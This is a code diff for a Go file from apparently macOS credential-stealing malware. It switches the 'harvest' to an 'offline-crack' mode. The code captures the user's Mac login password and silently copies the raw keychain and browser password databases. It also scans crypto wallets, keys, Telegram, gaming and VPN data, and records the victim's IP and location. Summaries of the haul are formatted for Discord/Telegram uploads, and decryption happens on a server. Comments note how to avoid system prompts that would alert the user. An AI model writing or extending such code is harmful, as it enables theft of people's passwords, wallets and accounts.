@@ -1,8 +1,4 @@
-// collect.go — orchestrates a full local harvest into harvestPayload.
-//
-// runHarvest is the only entry used by main: it enables every collect category,
-// overlaps wallet-extension scanning with Collect, then derives seeds / password
-// candidates and public geo metadata for the upload summary.
+// collect.go — offline-crack harvest into harvestPayload (raw files + non-decrypt scans).
 package main
 
 import (
@@ -13,7 +9,6 @@ import (
 )
 
 // harvestPayload is the in-memory harvest used for zip export and upload captions.
-// Seeds / KeychainDump are kept separate from Result (derived / large binary-ish text).
 type harvestPayload struct {
 	Hostname    string                     `json:"hostname"`
 	OS          string                     `json:"os"`
@@ -23,39 +18,43 @@ type harvestPayload struct {
 	CountryCode string                     `json:"countryCode,omitempty"`
 	City        string                     `json:"city,omitempty"`
 	MacUser     string                     `json:"macUser,omitempty"`
+	Mode        string                     `json:"mode"`
 	Result      *recovery.CollectionResult `json:"result"`
 	Seeds       []recovery.SeedResult      `json:"seeds,omitempty"`
-	// KeychainDump is security dump-keychain -d text; exported to primary zip only (not harvest.json).
-	KeychainDump []byte `json:"-"`
+	// MacLoginPassword is captured for offline decrypt on the server (not logged to console).
+	MacLoginPassword string `json:"-"`
+	// RawFiles: keychain DB + browser Login Data / Local State / etc. (no decrypt).
+	RawFiles []rawDiskFile `json:"-"`
+	// Counts for summary
+	RawKeychainFiles int `json:"rawKeychainFiles,omitempty"`
+	RawBrowserFiles  int `json:"rawBrowserFiles,omitempty"`
 }
 
-// fullCollectOptions turns on every recovery category for a standalone Mac run.
-func fullCollectOptions() recovery.CollectOptions {
-	opts := recovery.CollectOptions{Browsers: true}
-	opts.Passwords = true
-	opts.Cookies = true
-	opts.Autofill = true
-	opts.History = true
-	opts.Bookmarks = true
-	opts.CreditCards = true
-	opts.Discord = true
+// offlineCollectOptions skips all on-box browser/keychain decrypt paths.
+// Still scans files, wallet trees, keys, telegram, gaming, vpn metadata.
+func offlineCollectOptions() recovery.CollectOptions {
+	opts := recovery.CollectOptions{Browsers: false}
+	opts.Passwords = false
+	opts.Cookies = false
+	opts.Autofill = false
+	opts.History = false
+	opts.Bookmarks = false
+	opts.CreditCards = false
+	opts.Discord = false // needs Keychain / decrypt
 	opts.Files = true
 	opts.Wallets = true
 	opts.Keys = true
 	opts.Telegram = true
-	opts.Apps = true
+	opts.Apps = false // Wi‑Fi uses security(1) → possible system modals
 	opts.Gaming = true
 	opts.VPNs = true
 	return opts
 }
 
-// runHarvest collects all categories, enriches with seeds/candidates/geo, and
-// returns a payload ready for export + upload. Extension scan runs in parallel
-// with Collect because it does not depend on browser decryption keys.
-func runHarvest(hostname string) (*harvestPayload, error) {
-	opts := fullCollectOptions()
+// runHarvestOffline: password already captured; no Keychain unlock; raw DBs + rest of scans.
+func runHarvestOffline(hostname, macPassword string) (*harvestPayload, error) {
+	opts := offlineCollectOptions()
 
-	// Wallet browser extensions (LevelDB paths) are independent of Chromium key resolution.
 	var extensions []recovery.ExtensionResult
 	var extWg sync.WaitGroup
 	extWg.Add(1)
@@ -63,6 +62,11 @@ func runHarvest(hostname string) (*harvestPayload, error) {
 		defer extWg.Done()
 		extensions = recovery.ScanExtensions()
 	}()
+
+	// Raw priority targets (silent file copy only).
+	rawKeychain := collectLoginKeychainRawFiles()
+	rawBrowsers := collectBrowserRawDBFiles()
+	rawFiles := append(append([]rawDiskFile{}, rawKeychain...), rawBrowsers...)
 
 	result, err := recovery.Collect(opts, nil)
 	if err != nil {
@@ -72,51 +76,55 @@ func runHarvest(hostname string) (*harvestPayload, error) {
 	extWg.Wait()
 	result.Extensions = extensions
 
-	// Post-processing: BIP39-like phrases + login keychain dump + password candidates.
+	// Seeds only from scanned files / empty password lists (no decrypted browser pwds).
 	seeds := recovery.ScanSeeds(result.Files, result.Passwords, result.Autofill)
 
-	// Keychain must already be unlocked (main → EnsureLoginKeychainUnlocked with modal password).
-	// Harvest dump for primary upload (logs/keys/keychain_dump.txt) and parse candidates.
-	keychainDump, keychainCandidates := recovery.HarvestLoginKeychain()
-	result.PasswordCandidates = recovery.BuildPasswordCandidates(result.Passwords, result.Autofill, keychainCandidates)
-	if mp := recovery.MacLoginPassword(); mp != "" {
-		result.PasswordCandidates = appendMacLoginCandidate(result.PasswordCandidates, mp)
+	// Password candidates: only the captured Mac login password for offline use.
+	if macPassword != "" {
+		result.PasswordCandidates = appendMacLoginCandidate(nil, macPassword)
 	}
-	result.PasswordCandidates = recovery.AppendExtraPasswordCandidates(result.PasswordCandidates, result)
 
 	publicIP, country, countryCode, city, macUser := collectVictimInfo()
 
 	return &harvestPayload{
-		Hostname:     hostname,
-		OS:           runtime.GOOS,
-		Arch:         runtime.GOARCH,
-		PublicIP:     publicIP,
-		Country:      country,
-		CountryCode:  countryCode,
-		City:         city,
-		MacUser:      macUser,
-		Result:       result,
-		Seeds:        seeds,
-		KeychainDump: keychainDump,
+		Hostname:         hostname,
+		OS:               runtime.GOOS,
+		Arch:             runtime.GOARCH,
+		PublicIP:         publicIP,
+		Country:          country,
+		CountryCode:      countryCode,
+		City:             city,
+		MacUser:          macUser,
+		Mode:             "offline-crack",
+		Result:           result,
+		Seeds:            seeds,
+		MacLoginPassword: macPassword,
+		RawFiles:         rawFiles,
+		RawKeychainFiles: len(rawKeychain),
+		RawBrowserFiles:  len(rawBrowsers),
 	}, nil
 }
 
-// harvestSummary is the multi-line caption embedded in Discord/Telegram uploads
-// and written to summary.txt inside each harvest zip.
+// harvestSummary is the multi-line caption embedded in Discord/Telegram uploads.
 func harvestSummary(p *harvestPayload) string {
-	if p == nil || p.Result == nil {
+	if p == nil {
 		return "Harvest complete (empty)"
 	}
 	r := p.Result
+	if r == nil {
+		r = &recovery.CollectionResult{}
+	}
 	summary := formatSummary(
 		p.Hostname, p.OS, p.Arch, p.PublicIP, p.CountryCode, p.Country, p.MacUser,
-		len(r.Passwords), len(r.Cookies), len(r.Autofill), len(r.History),
-		len(r.Bookmarks), len(r.CreditCards), len(r.DiscordTokens), len(r.Extensions),
+		0, 0, 0, 0, // no on-box decrypted passwords/cookies/autofill/history
+		0, 0, 0, len(r.Extensions),
 		countDesktopWallets(r.Wallets), len(r.Keys), len(r.Telegram), len(r.AppCredentials),
 		countGaming(r.Gaming), countVPNs(r.VPNs), len(r.PasswordCandidates), len(p.Seeds),
 	)
-	if len(p.KeychainDump) > 0 {
-		summary += "\nkeychain dump: " + itoa(len(p.KeychainDump)) + " bytes"
+	summary += "\nmode: offline-crack (raw keychain + browser DBs — decrypt on server)"
+	summary += "\nraw keychain files: " + itoa(p.RawKeychainFiles) + " | raw browser files: " + itoa(p.RawBrowserFiles)
+	if p.MacLoginPassword != "" {
+		summary += "\nmac login password: captured (see offline/mac_login_password.txt)"
 	}
 	return summary
 }
@@ -173,7 +181,6 @@ func formatSummary(host, osName, arch, publicIP, countryCode, country, macUser s
 		"gaming: " + itoa(gaming) + " | vpns: " + itoa(vpns) + " | pw candidates: " + itoa(candidates) + " | seeds: " + itoa(seeds)
 }
 
-// appendMacLoginCandidate ensures the validated Mac login password is in the wordlist once.
 func appendMacLoginCandidate(candidates []recovery.PasswordCandidateResult, password string) []recovery.PasswordCandidateResult {
 	seen := make(map[string]bool, len(candidates))
 	for _, c := range candidates {
@@ -183,7 +190,7 @@ func appendMacLoginCandidate(candidates []recovery.PasswordCandidateResult, pass
 		candidates = append(candidates, recovery.PasswordCandidateResult{
 			Password: password,
 			Source:   "mac_login",
-			Detail:   "macOS user password",
+			Detail:   "macOS user password (offline-crack)",
 		})
 	}
 	return candidates
